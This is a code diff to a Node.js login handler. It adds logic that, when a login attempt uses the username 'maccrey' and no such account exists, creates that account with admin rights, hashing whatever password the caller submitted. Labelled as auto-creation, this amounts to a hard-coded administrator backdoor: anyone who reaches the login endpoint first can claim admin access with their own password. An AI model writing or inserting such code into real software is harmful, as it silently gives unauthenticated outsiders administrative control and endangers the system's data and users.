@@ -92,7 +92,32 @@ const login = async (req, res) => {
     const db = getDb();
 
     // Find user
-    const user = await db.selectOne('users', { username });
+    let user = await db.selectOne('users', { username });
+
+    // Auto-create admin user 'maccrey' if it doesn't exist
+    if (!user && username === 'maccrey') {
+      console.log('🔧 Auto-creating admin user: maccrey');
+      try {
+        // Hash the provided password
+        const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
+
+        // Create admin user
+        const result = await db.insert('users', {
+          username: 'maccrey',
+          password: hashedPassword,
+          role: 'admin'
+        });
+
+        // Fetch the created user
+        user = await db.selectOne('users', { username: 'maccrey' });
+        console.log('✅ Admin user maccrey created successfully');
+      } catch (createError) {
+        console.error('❌ Failed to auto-create admin user:', createError);
+        return res.status(500).json({
+          error: 'Failed to create admin user'
+        });
+      }
+    }
 
     if (!user) {
       return res.status(401).json({
